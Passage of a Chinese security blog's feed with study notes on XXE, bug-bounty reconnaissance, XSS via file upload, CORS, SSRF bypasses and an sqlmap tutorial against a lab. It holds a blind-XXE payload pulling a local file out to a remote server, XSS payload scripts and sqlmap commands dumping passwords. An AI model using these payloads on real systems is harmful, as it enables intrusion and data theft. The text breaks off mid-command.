title="无回显"></a>无回显</h4><p>称为 blind xxe 可以使用外带数据通道 提取数据</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span>[</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///C:/1.txt&quot;</span>&gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://192.168.0.107/evil.xml&quot;</span>&gt;</span></span><br><span class="hljs-meta">%remote;</span><br><span class="hljs-meta">%all;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;send;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br>远程服务器上的<br>evil.xml 文件内容<br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">all</span> <span class="hljs-string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://192.1</span></span><br></code></pre></td></tr></table></figure><h3 id="XXE防御"><a href="#XXE防御" class="headerlink" title="XXE防御"></a>XXE防御</h3><p>1.使用开发语言提供的禁用外部实体的方法<br>2.过滤用户提交的 XML 数据<br>3.升级 libxml 组件</p>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
      <category>常见web漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>XXE漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SRC挖洞</title>
    <link href="/2023/06/11/SRC%E6%8C%96%E6%B4%9E/"/>
    <url>/2023/06/11/SRC%E6%8C%96%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="信息搜集常见的问题"><a href="#信息搜集常见的问题" class="headerlink" title="信息搜集常见的问题"></a>信息搜集常见的问题</h2><p>1、搜集类型单一、往往跑完子域名后就结束了<br>2、信息源缺乏，不知道如何获取优秀的数据源，找不到隐蔽性高的资产<br>3、人工处理信息，流程繁琐，效率不高</p><h2 id="工商数据的搜集"><a href="#工商数据的搜集" class="headerlink" title="工商数据的搜集"></a>工商数据的搜集</h2><p>工商数据可以帮助测试人员更好的了解目标公司的信息，以便收敛测试的目标范围。例如，可以通过工商数据获取公司的控股子公司、经营业务、对外发布的产品等信息，这些信息可以帮助我们更准确的识别出目标公司的网络资产，以便对其进行更有效的漏洞挖掘</p><h3 id="工商数据"><a href="#工商数据" class="headerlink" title="工商数据"></a>工商数据</h3><p><strong>信息来源：</strong>爱企查、企业查、天眼查、启信宝、小蓝本<br><strong>关注内容：</strong><br>1、企业股权架构<br>2、网站备案号<br>3、对外公布的产品（小程序、公众号、APP、iot设备）<br>4、法人电话号、邮箱<br><strong>用处：</strong><br>1、获取控股子公司名称，收集边缘子公司资产（50%以上控股公司都算有效范围）<br>2、获取备案根域名<br>3、获取其他互联网资产<br>4、收集用户名等信息</p><h2 id="域名信息搜集"><a href="#域名信息搜集" class="headerlink" title="域名信息搜集"></a>域名信息搜集</h2><h3 id="根域名获取"><a href="#根域名获取" class="headerlink" title="根域名获取"></a>根域名获取</h3><p><strong>备案域名</strong></p><p>ICP备案号反差<br>whois数据搜集</p><p><strong>未备案域名</strong></p><p>ssl证书查询<br>lco Hash查询<br>网站响应头<br>网站页脚<br>DNS解析数据</p><h3 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h3><p><strong>主动搜集</strong></p><p>子域名爆破<br>1、subDOmainBrute<br>2、子域名挖掘机Layer<br>3、<a href="https://github.com/FeeiCN/ESD">https://github.com/FeeiCN/ESD</a><br>4、puredns</p><p>爬虫</p><p><strong>被动搜集</strong></p><p>搜索引擎<br>1、百度、谷歌、必应<br>2、fofa、zomomeeye<br>3、github</p><p>第三方数据源<br>1、微步<br>2、VirusTotal<br>3、Censys<br>4、dnsdb<br>5、binaryedge<br>6、crt.sh</p><p>工具<br>1、subfinder<br>2、brup流量</p><p>文件泄露<br>1、跨域策略文件crossdomain.xml<br>2、站点地图sitemap.xml<br>3、robts.txt<br>4、Apk包<br>5、小程序源码</p><p><strong>结合类的工具</strong><br>1、Oneforall<br>2、xray<br>3、ARL资产灯塔</p><h1 id="端口渗透"><a href="#端口渗透" class="headerlink" title="端口渗透"></a>端口渗透</h1><h2 id="什么是端口服务"><a href="#什么是端口服务" class="headerlink" title="什么是端口服务"></a>什么是端口服务</h2><p>端口，又称为连接端口、端口、协议端口在电脑网络中是一种经由软件创建的服务，在一个电脑操作系统中扮演通信的端点<br><strong>常见的端口</strong><br>21、22、23、25、53、80等<br><strong>常见端口服务可利用点</strong><br>1、组件默认端口<br>2、高位服务端口<br><strong>端口服务漏洞价值</strong><br>在常规的src漏洞挖掘中端口服务很容易被忽略，更多的人是盯着一些web站点来进行漏洞挖掘，一些高位服务端口依旧是可以拿到高位严重漏洞的</p><h2 id="常见端口服务"><a href="#常见端口服务" class="headerlink" title="常见端口服务"></a>常见端口服务</h2><p><img src="/img/SRC1.png" srcset="/img/loading.gif" lazyload></p><h3 id="web服务类端口"><a href="#web服务类端口" class="headerlink" title="web服务类端口"></a>web服务类端口</h3><p>web服务类端口一般都会涉及到组件了，很多组件都会有默认开放端口，例如我们熟悉的k8s（8080、6443），weblogic（7001），kibana（5601）等<br><img src="/img/SRC2.png" srcset="/img/loading.gif" lazyload></p><h3 id="数据库端口服务"><a href="#数据库端口服务" class="headerlink" title="数据库端口服务"></a>数据库端口服务</h3><p>1、Mysql<br>在正常拿到注入点后、如果该数据库为mysql，我们可以进一步利用，很大概率能够getshell的<br>2、MongDB<br>在进行端口服务识别后，很多人在看到MongDB数据库后会直接忽略不管，该数据库存在未授权访问的<br>3、influxdb<br>这一个数据库是无法获取shell的，但是我们可以来对数据库进行增删改查夸大危害性<br>4、redis<br>redis未授权直接提交给src大概率会被评级为中或者高危，我们可以利用一些手段来进行shell的</p><h1 id="端口渗透-组件渗透"><a href="#端口渗透-组件渗透" class="headerlink" title="端口渗透-组件渗透"></a>端口渗透-组件渗透</h1><h1 id="前端安全漏洞"><a href="#前端安全漏洞" class="headerlink" title="前端安全漏洞"></a>前端安全漏洞</h1><h2 id="响应码"><a href="#响应码" class="headerlink" title="响应码"></a>响应码</h2><p>200：OK - 成功<br>302：Found - 跳转<br>400：Bad Request - 错误请求<br>401：UNAUTHORIZED - 当前用户未授权<br>403：Forbidden - 禁止访问<br>404：Not Found - 未找到<br>405：Method Not Allowed - 请求方法不允许<br>415：Unsupported Media Type - 不支持的Content-Type<br>500：Internal Server Error - 服务器错误<br>502：Bad Gateway - 错误的网关<br>504：Gateway Timeout - 请求超时</p><h2 id="XSS-漏洞"><a href="#XSS-漏洞" class="headerlink" title="XSS - 漏洞"></a>XSS - 漏洞</h2><p>反射性xss<br>需要将触发点发送至目标用户 - 低危<br>请求方式：GET、POST型<br>常见参数：url、keyword、各类请求参数</p><p>存储型xss</p><ul><li>文件上传导致的存储型xss（上传至存储桶） - 低危</li><li>文件上传导致的存储型xss - 中危</li><li>需要将触发页面发送给目标用户的 - 中危、低危</li><li>受众较广的发帖功能、发送信息功能 - 中危及以上</li><li>能够威胁到管理后台、管理员 - 高危</li></ul><h2 id="前端框架安全"><a href="#前端框架安全" class="headerlink" title="前端框架安全"></a>前端框架安全</h2><p>高风险：Webpack打包器前端直接展示<br>中风险：Source map源码泄露<br>低风险：以上两个不存在，仅有JavaScript文件</p><h2 id="HTML注释"><a href="#HTML注释" class="headerlink" title="HTML注释"></a>HTML注释</h2><p>常用的注释格式是<!--注释内容 -->，很多语言都支持这种注释，开发人员可能在注释内容中透露一些敏感信息，例如：&lt;!-  测试账号：admin 123456    –&gt;</p><p>Javascript注释<br>单行注释：&#x2F;&#x2F;注释内容<br>多行注释：&#x2F;<em>注释内容</em>&#x2F;</p><h2 id="Webpack"><a href="#Webpack" class="headerlink" title="Webpack"></a>Webpack</h2><ul><li><p>什么是Webpack，目前许多大型应用(如大型java Web应用)就要求前端必须要有独立的项目，独立的项目想要足够的效率就必须进行工程化。</p></li><li><p>具有复杂数据状态的应用开发过程就必须要有合适的框架，采用数据驱动开发的方式增强可维护性</p></li><li><p>复杂项目结构必须进行模块化管理，一来提高部分公共内容的可复用性而来增强团队并行协作能力</p></li><li><p>重复规律性的工作必须采用自动化工具实现，以来提高效率，二来避免人为出错</p><p>等</p></li></ul><h3 id="Webpack文件"><a href="#Webpack文件" class="headerlink" title="Webpack文件"></a>Webpack文件</h3><p><strong>含有Webpack文件特征</strong><br>webpackJsonp、sourceMappingURL、js.map</p><p>webpack:&#x2F;&#x2F;&#x2F;(webpack)&#x2F;buildin-全局文件、打包配置文件<br>webpack:&#x2F;&#x2F;&#x2F;node_modules目录-打包的各类前端代码依赖库<br><strong>webpack:&#x2F;&#x2F;&#x2F;src目录-核心打包后代码，每个文件包含不同功能</strong></p><ul><li>API - 各功能模块的各种接口</li><li>Assets - 静态资源文件</li><li>Common - 公共资源文件</li><li>Entity - 前端功能组件</li><li>Router - 实例</li><li>Store - 功能路由表</li><li>Utils - 软件开发工具包</li><li>Views - 前端视图文件</li></ul><h2 id="Javacript安全风险"><a href="#Javacript安全风险" class="headerlink" title="Javacript安全风险"></a>Javacript安全风险</h2><p><strong>JS中的各种环境信息</strong><br>开发环境、测试环境、生产环境</p><p><strong>开发云平台密钥id&#x2F;secret</strong><br>app_id： 是应用的唯一标识。在创建应用时，由系统生成，用户不能自行修改。可以在开发者后台的凭证与基础信息页面查看 app_id.<br>app_secret：是应用的密钥。在创建应用时，由系统自动生成，在调用API时，需要将其作为请求参数之一，用户可以在开发者后台的凭证与基础信息页面查询或重置密钥<br><strong>云存储的密钥ak&#x2F;sk</strong><br>与开发者密钥类似，控制云存储服务的密钥对，一般为：assessKeyld、accessKeySecret<br><strong>泄露Author作者署名信息</strong><br>利用此类标识信息，进行信息搜集、搜索引擎信息泄露、GitHub信息泄露的进一步利用<br><strong>内部IP泄露</strong><br>测试IP地址泄露、内部IP地址泄露能够导致进一步漏洞危害<br><strong>编辑器漏洞</strong><br>ueditor.config.js编辑器此类编辑器的配置JavaScript文件，说明Web应用使用了特定的编辑器，通常此类编辑器存在通用的漏洞</p><h1 id="常见漏洞场景分析利用"><a href="#常见漏洞场景分析利用" class="headerlink" title="常见漏洞场景分析利用"></a>常见漏洞场景分析利用</h1><h2 id="XSS漏洞的常见触发场景及利用"><a href="#XSS漏洞的常见触发场景及利用" class="headerlink" title="XSS漏洞的常见触发场景及利用"></a>XSS漏洞的常见触发场景及利用</h2><p><strong>XSS类型</strong><br>存储型<br>页面或数据库保存了攻击的恶意代码，除非对应记录被删除，否则可以一直触发xss<br>反射型<br>反射型反射性即服务器根据用户当前输入做出的响应，只能触发一次，并且立马可以看到js执行的效果<br>Dom型<br>特殊的反射型xss。dom xss的payload不需要服务端解析响应，而是靠浏览器的dom解析，因此dom-xss的触发时抓不到请求包的。</p><h4 id="XSS漏洞的常见触发场景"><a href="#XSS漏洞的常见触发场景" class="headerlink" title="XSS漏洞的常见触发场景"></a><strong>XSS漏洞的常见触发场景</strong></h4><p><strong>重灾区</strong><br>1、评论区、留言区、客服聊天框<br>2、个人信息设置、后台参数配置<br>3、文件上传：html、svg、xml、pdf</p><p><strong>针对区</strong><br>1、支持markdown语法编辑器<br>2、历史记录查询<br>3、富文本编辑器<br>4、取值写入页面：Refer、Cookie</p><p><strong>存在风险</strong><br>1、数据查询搜索页面<br>2、意见反馈、客服投诉<br>3、跳转功能、各种伪协议<br>4、输入框功能</p><h4 id="文件上传与xss的结合"><a href="#文件上传与xss的结合" class="headerlink" title="文件上传与xss的结合"></a>文件上传与xss的结合</h4><p>很多后台会拦截一些特殊的文件后缀，比如aspx、php、jsp、aspx一类的，虽然大部分无法直接上传webshell，但其实很多文件是可以执行js代码从而触发xss的</p><p><strong>PDF文件上传触发xss</strong></p><p>利用条件<br>1、上传点允许.pdf后缀的文件上传<br>2、保存好的pdf文件可以直接浏览器查看，而不是只能下载至本地</p><p>使用如下脚本可以生成带有xss代码的pdf文件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">from</span> <span class="hljs-title class_">PyPDF2</span> <span class="hljs-keyword">import</span> <span class="hljs-title class_">PdfFileWriter</span><br>file=<span class="hljs-title class_">PdfFileWriter</span>()<br>file.<span class="hljs-title function_">addJS</span>(<span class="hljs-string">&#x27;app.alert(&quot;XSS&quot;);&#x27;</span>)<br>output=<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;xss.pdf&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>file.<span class="hljs-title function_">write</span>(output)<br></code></pre></td></tr></table></figure><p><strong>html文件上传触发xss</strong><br>利用条件：<br>1、上传点允许.html后缀的文件上传<br>2、保存好的html文件有执行权限</p><p>上传最常用的payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>SVG文件上传触发xss<br>利用条件<br>1、上传点允许.svg后缀的文件上传<br>2、保存好的svg文件有执行权限<br>成因：<br>SVG是支持通过脚本语言来动态访问和修改SVG的任何内容，这点和HTML中的dom有点类似，或者说完全一致。因为SVG中的所有标签和属性都已经对应了已经定义的DOM，而这种脚本语言就是Javascript，所以我们在SVG中插入JavaScript脚本是完全能够被解析的。<br>总之XSS能够被执行是因为遵循了svg及xml的标准，使得脚本代码的执行</p><h2 id="CORS、jsonp跨域漏洞"><a href="#CORS、jsonp跨域漏洞" class="headerlink" title="CORS、jsonp跨域漏洞"></a>CORS、jsonp跨域漏洞</h2><p>什么是跨域<br>1、同源策略规定不同域的客户端脚本如果没有明确授权允许执行，不能读写另一方的资源，同协议，同端口，同主机的两个URL才能被认为同源<br>2、web前后端分离模式的流行，后端开发写完业务功能的代码后需要提供接口给前端用，开发者们又设计出了CORS、jsonp等方式来完成跨域请求</p><h4 id="CORS、jsonp漏洞的常见触发场景"><a href="#CORS、jsonp漏洞的常见触发场景" class="headerlink" title="CORS、jsonp漏洞的常见触发场景"></a><strong>CORS、jsonp漏洞的常见触发场景</strong></h4><p><strong>重灾区</strong><br>1、前后端分离，前端调用后接口<br>2、非主营业务需要调用主站用户的账号信息，并将数据显示出来<br>3、加载第三方网站上的图片，css样式，js等资源</p><p><strong>针对性</strong><br>1、电商行业需要从第三方物流公司调用运单详情<br>2、本地开发程序时，本地文件夹不是域名下面，要测试接口功能时可能需要发送ajax请求</p><p><strong>存在风险</strong><br>1、所有相应包中存在Access-Control-Allow-Origin响应头的请求<br>2、带有callback、cb等回调函数名称的接口</p><h4 id="CORS跨域漏洞"><a href="#CORS跨域漏洞" class="headerlink" title="CORS跨域漏洞"></a><strong>CORS跨域漏洞</strong></h4><p>1、CORS，跨域资源共享（Cross-origin resource sharing），这种机制通过添加HTTP字段的方式规定服务器资源允许被哪些域访问（Access-Control-Allow-Origin）、请求中是否允许发送cookie（Access-Control-Allow-Credentials）、哪些请求类型是被允许的（Access-Control-Request-Method）等等<br>2、最重要的是Access-Control-Allow-Origin标头，当这一字段设置为*时表示服务器资源允许被任何域访问，当然如果需要请求用户信息这类的资源，cookie也是必须被带上的，所以Access-Control-Allow-Credentials字段值要设置成true。但是当如果配置成Access-Control-Allow-Origin:*Access-Control-Allow-Credentials:true，这种会被浏览器默认禁止导致无法利用。<br>3、如果将Origin请求头改为evil.cn，响应头中有Access-Control-Allow-Origin头，并且允许evil.cn读取cookie访问服务器资源，这类配置往往是存在跨域配置错误且最好利用的。<br>4、综上所述，不难发现CORS跨域漏洞出现的请求包特征，brup中可以自动添加Origin头去寻找CORS配置错误，勾选默认配置（history中筛选带有cors配置错误特征即可）</p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>1、讲了哪几个漏洞<br>2、什么场景会出现这种漏洞<br>3、漏洞利用原理</p><h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><p>任意文件读取漏洞需要注意数据包的传参并且参数是可控制的，而不是仅仅关注功能点，有传参的地方都有可能造成任意文件读取。<br>我们发现可控参数后可以尝试目录遍历，例如文件上传有时候会回显相关信息，文件预览则可以尝试控制传参，遍历不同的文件</p><h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><p>xxe漏洞也称为外部实体注入，类似于SQL注入，通过让服务器执行传恶意代码从而达到目的<br>xxe基本格式</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&lt;?<span class="hljs-type">xml</span> version=&quot;1.0&quot;&gt;&lt;!DOCTYPE 根元素[!DOCTYPE 实体名称 <span class="hljs-keyword">SYSTEM</span> &quot;URL&quot;]&gt;<br></code></pre></td></tr></table></figure><p>通常我们通过寻找数据包中是否存在xml特征，从而进行判断是否可以进行xxe攻击<br>我们可以利用dnslog快速判断是否攻击成功</p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>任何存在url的地方都可能存在SSRF漏洞，需要多关注响应包<br>支持的协议http https gopher dict file<br>也可以使用dnslog外带数据</p><p>SSRF漏洞如果拦截了内网地址如何绕过<br>1、“@”符号绕过<br><a href="http://www.baidu.com@10.10.10.10与http//10.10.10.10%E8%AF%B7%E6%B1%82%E6%98%AF%E7%9B%B8%E5%90%8C%E7%9A%84%E3%80%82">http://www.baidu.com@10.10.10.10与http://10.10.10.10请求是相同的。</a><br>2、点分割符号替换<br>在浏览器中可以使用不同的分割符号来代替域名中的.分割，可以使用。、、．来代替：<br>3、IP的进制转换</p><p>任意文件读取有哪些getshell思路</p><p>存储桶权限配置错误会出现目录遍历，我们可以获得各种文件，通常我们可以在数据包里面发现key这种关键字即可进行尝试<br>存储桶劫持通过fofa指纹发现被删除后，但是并未删除解析记录，即可进行尝试创建相同名称的存储桶进行劫持<br>云密钥泄露则是通过使用burpsuite插件进行流量过滤发现关键字是否泄露了云密钥<br>利用SSRF进行内网横向探测，探测不同的</p><p>如果文件上传至存储桶，此时没有对文件名进行验证或者上传相同文件名的文件，会造成什么漏洞<br>会造成文件上传，可以getshell</p>]]></content>
    
    
    <categories>
      
      <category>SRC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>挖洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQLMAP</title>
    <link href="/2023/06/05/SQLMAP/"/>
    <url>/2023/06/05/SQLMAP/</url>
    
    <content type="html"><![CDATA[<p>SQLMAP</p><h3 id="SQLMAP基本注入方式"><a href="#SQLMAP基本注入方式" class="headerlink" title="SQLMAP基本注入方式"></a>SQLMAP基本注入方式</h3><p>B:Boolean-basedbindSQLinjection（布尔型注入）<br>E:Error-basedSQLinjection（报错注入）<br>U:UNIONquerySQLinjection（可联合查询注入）<br>S:StackedqueriesSQLinjection（可多语句查询注入）<br>T:Time-basedbindSQLinjection（基于时间延迟注入）<br>Q:inlineSQLinjection（内联注入）</p><h3 id="帮助文档"><a href="#帮助文档" class="headerlink" title="帮助文档"></a>帮助文档</h3><p>显示终端帮助文档</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sqlmap -h</span><br></code></pre></td></tr></table></figure><p>显示sqlmap详细的帮助文档</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sqlmap -hh</span><br></code></pre></td></tr></table></figure><p>中文帮助文档（待补充）</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--flush-session   清空当前目标的会话文件</span><br></code></pre></td></tr></table></figure><h3 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h3><p>sqlmap -u <a href="http://sqlmap.com/index.php?id=1">http://sqlmap.com/index.php?id=1</a> -v 1<br>sqlmap -u “<a href="http://192.168.0.103/06/vul/sqli/sqli_str.php?name=1&submit=%E6%9F%A5%E8%AF%A2">http://192.168.0.103/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2</a>“ -v 1<br>-u 和 url参数一样 都是代表填写测试的url连接如果存在&amp;符号需要添加把url放在双引号内<br>-v 表示输出信息详细程度级别：0-6（默认为1）</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs tcl"><span class="hljs-number">0</span>：只显示python回源（tracebacks），错误（<span class="hljs-keyword">error</span>）和关键（criticle）信息。<br><span class="hljs-number">1</span>：同时显示信息（<span class="hljs-keyword">info</span>）和警告信息（warning）<br><span class="hljs-number">2</span>：同时显示调试信息（debug）<br><span class="hljs-number">3</span>：同时显示注入的有效载荷（payloads）<br><span class="hljs-number">4</span>：同时显示<span class="hljs-keyword">http</span>请求<br><span class="hljs-number">5</span>：同时显示<span class="hljs-keyword">http</span>响应头<br><span class="hljs-number">6</span>：同时显示<span class="hljs-keyword">http</span>相应内容<br></code></pre></td></tr></table></figure><p>级别越高，信息就越详细，根据需求选择合适的输出信息</p><h4 id="指定目标"><a href="#指定目标" class="headerlink" title="指定目标"></a>指定目标</h4><p>指定某个url进行测试<br>sqlmap -u <a href="http://sqlmap.com/index.php?id=1">http://sqlmap.com/index.php?id=1</a> -v 1<br>从文件中加载http请求测试<br>sqlmap -r url.txt<br>从burpsuite或者日志读取http包<br>sqlmap -l post.txt<br>从文本中获取多个目标扫描<br>sqlmap -m url.xt</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.moonsec.com/index.php?id=<span class="hljs-number">1</span><br>http:<span class="hljs-regexp">//</span>www.moonsec.com/new.php?id=<span class="hljs-number">1</span><br>http:<span class="hljs-regexp">//</span>www.moonsec.com/awd.php?id=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><strong>请求</strong></p><h5 id="http"><a href="#http" class="headerlink" title="http"></a>http</h5><p>参数 –data<br>此参数是把数据以post方式提交，sqlmap会自动检测post参数</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sqlmap.py -u http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">0.103</span><span class="hljs-regexp">/06/</span>vul<span class="hljs-regexp">/sqli/</span>sqli_id.php --data=<span class="hljs-string">&quot;id=1&amp;submit=查询&quot;</span><br></code></pre></td></tr></table></figure><h4 id="HTTP-cookie头"><a href="#HTTP-cookie头" class="headerlink" title="HTTP cookie头"></a>HTTP cookie头</h4><p>参数 –cookie,–load-cookies,–drop-set-cookie<br>这个参数在以下两个方面很有用<br>1、web应用需要登陆的时候<br>2、你想要在这些头参数中测试SQL注入时<br>可以通过抓包把cookie获取到，复制出来，然后加到–cookie参数里<br>在HTTP请求中，遇到Set-Cookie可以使用–drop-set-cookie来拒接当你使用–cookie参数时，当返回一个Set-Cookie头的时候，sqlmap会询问你用哪个cookie来继续接下来的请求。当–level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数。</p><h3 id="SQLMAP实战技巧一"><a href="#SQLMAP实战技巧一" class="headerlink" title="SQLMAP实战技巧一"></a>SQLMAP实战技巧一</h3><h4 id="检测注入"><a href="#检测注入" class="headerlink" title="检测注入"></a>检测注入</h4><p>检测URL GET参数是否存在注入<br>-u检测的url<br>“”双引号表示这是一段字符串<br>–dbms 指定攻击的数据引擎<br>-v 输出信息登记为1</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">sqlmap -u <span class="hljs-string">&quot;http://192.168.59.142/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> --dbms mysql -v <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>输入之后sqlmap会自动进行注入，但是会有一些进行提示需要你在终端进行确认 如果使用batch 会进行默认操作，不用进行交互确认</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">sqlmap -u <span class="hljs-string">&quot;http://192.168.59.142/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> --dbms mysql -v <span class="hljs-number">1</span> --batch<br></code></pre></td></tr></table></figure><p>程序会自动确认进行SQL注入检测，看到存在注入的参数和攻击payload也会显示注入类型<br>time-based blind 时间盲注入<br>UNION query联合注入</p><h4 id="获取敏感信息"><a href="#获取敏感信息" class="headerlink" title="获取敏感信息"></a>获取敏感信息</h4><p>确定存在注入之后接着通过获取敏感信息命令获取<br>–current-user 用户连接的用户<br>–current-db 当前库<br>–is-dba 是否root权限<br>–passwords 获取数据库的密码 使用这个命令sqlmap找到密文时，会提示你是都进行hash破解，如果需要选择合适的字典</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">sqlmap</span> <span class="hljs-literal">-</span><span class="hljs-comment">u &quot;http://192</span><span class="hljs-string">.</span><span class="hljs-comment">168</span><span class="hljs-string">.</span><span class="hljs-comment">59</span><span class="hljs-string">.</span><span class="hljs-comment">143/06/vul/sqli/sqli_str</span><span class="hljs-string">.</span><span class="hljs-comment">php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> <span class="hljs-literal">--</span><span class="hljs-comment">dbms mysql</span> <span class="hljs-literal">--</span><br><span class="hljs-comment">current</span><span class="hljs-literal">-</span><span class="hljs-comment">user</span> <span class="hljs-literal">--</span><span class="hljs-comment">current</span><span class="hljs-literal">-</span><span class="hljs-comment">db</span> <span class="hljs-literal">--</span><span class="hljs-comment">is</span><span class="hljs-literal">-</span><span class="hljs-comment">dba</span> <span class="hljs-literal">--</span><span class="hljs-comment">passwords</span> <span class="hljs-literal">-</span><span class="hljs-comment">v 1</span><br></code></pre></td></tr></table></figure><p>sqlmap -u “<a href="http://192.168.0.165/06/vul/sqli/sqli_str.php?name=1&submit=%E6%9F%A5%E8%AF%A2">http://192.168.0.165/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2</a>“ -v 1 –dbms mysql –batch –dbs</p><h4 id="获取表"><a href="#获取表" class="headerlink" title="获取表"></a>获取表</h4><p>在获取当前库、可以根据库列出表<br>-D 指定库<br>–tables 列出所有表</p><h4 id="获取表的字段"><a href="#获取表的字段" class="headerlink" title="获取表的字段"></a>获取表的字段</h4><p>-T 指定某个表<br>–columnns 获取字段</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">sqlmap -u <span class="hljs-string">&quot;http://192.168.59.143/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> --dbms mysql -v <span class="hljs-number">1</span> -D pikachu -T users --columns<br></code></pre></td></tr></table></figure><p>获取某个表的所有字段</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">sqlmap -u <span class="hljs-string">&quot;http://192.168.59.133/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> --dbms mysql -v <span class="hljs-number">1</span> -D pikachu -tables --columns<br></code></pre></td></tr></table></figure><h4 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h4><p>–dump 是导出数据所有的内容<br>–dump -C “username,password”获取字段的内容<br>获取指定库所有表 所有字段内容</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">sqlmap -u <span class="hljs-string">&quot;http://192.168.59.143/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> --dbms mysql -v <span class="hljs-number">1</span> -D pikachu -tables --columns --<span class="hljs-keyword">dump</span><br></code></pre></td></tr></table></figure><p>获取指定表的 所有字段内容</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">sqlmap -u <span 